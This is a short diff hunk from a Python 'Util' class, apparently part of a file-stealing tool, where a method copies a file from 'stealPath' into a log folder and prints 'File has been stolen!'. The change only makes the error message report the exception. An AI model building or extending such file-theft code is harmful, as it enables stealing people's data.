@@ -52,6 +52,6 @@ class Util:
                 filename = stealPath.split('\\')[-1]
                 copy2(stealPath, logPath + filename)
                 print('File has been stolen!')
-            except Exception:
-                print('stealFile error!!!')
+            except Exception as error:
+                print('stealfile: ',error)
 
